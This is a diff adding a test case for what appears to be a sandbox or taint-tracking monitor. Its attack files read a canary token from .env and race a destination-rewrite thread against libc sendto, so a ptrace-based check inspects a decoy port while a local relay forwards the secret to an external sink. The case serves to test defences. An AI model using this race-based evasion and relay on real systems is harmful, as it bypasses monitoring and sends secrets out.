@@ -1,0 +1,80 @@
+# A local relay is tainted when it reads, not when the sender's address says so.
+# Shell 1 (another principal) runs a UDP relay forwarding whatever it reads to
+# the external sink. Shell 0 reads the secret, then sends it while a concurrent
+# writer alternates the named destination between an unbound loopback port and
+# the relay's. The ptrace gate hands taint to whoever holds the port it read;
+# the kernel delivers to the port it copied. Privileged mode taints the relay at
+# its receive, so the relay's forward is refused whichever port the race chose.
+name = "local-handoff-rewrite"
+kind = "attack"
+policy = "recommended"
+
+[variants]
+attempts = [400, 1024, 4096]
+
+[[files]]
+path = ".env"
+contents = "TOKEN={CANARY}\n"
+
+[[files]]
+path = "relay.py"
+contents = """
+import socket
+relay = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+relay.bind(("127.0.0.1", 18081))
+relay.settimeout(20)
+out = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+try:
+    while True:
+        data = relay.recv(65536)
+        try:
+            out.sendto(data, ("{SINK_HOST}", {SINK_PORT}))
+        except OSError:
+            pass
+except socket.timeout:
+    pass
+"""
+
+[[files]]
+path = "race.py"
+contents = """
+import ctypes, socket, struct, threading, time
+libc = ctypes.CDLL(None, use_errno=True)
+libc.sendto.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_size_t,
+                       ctypes.c_int, ctypes.c_void_p, ctypes.c_uint]
+secret = open('.env', 'rb').read()
+time.sleep(0.5)
+data = ctypes.create_string_buffer(secret)
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+def address(port):
+    return struct.pack('H', socket.AF_INET) + struct.pack('!H', port) + socket.inet_aton('127.0.0.1') + bytes(8)
+decoy, relay = address(18082), address(18081)
+named = ctypes.create_string_buffer(decoy, 16)
+done = threading.Event()
+def rewrite():
+    while not done.is_set():
+        ctypes.memmove(named, decoy, 16)
+        ctypes.memmove(named, relay, 16)
+writer = threading.Thread(target=rewrite)
+writer.start()
+try:
+    for _ in range({ATTEMPTS}):
+        libc.sendto(s.fileno(), data, len(secret), 0, named, 16)
+finally:
+    done.set()
+    writer.join()
+time.sleep(0.5)
+"""
+
+[[steps]]
+shell = 1
+run = "python3 relay.py &"
+expect = "accepted"
+
+[[steps]]
+shell = 0
+run = "python3 race.py"
+expect = "any"
+
+[oracle]
+encodings = ["raw"]
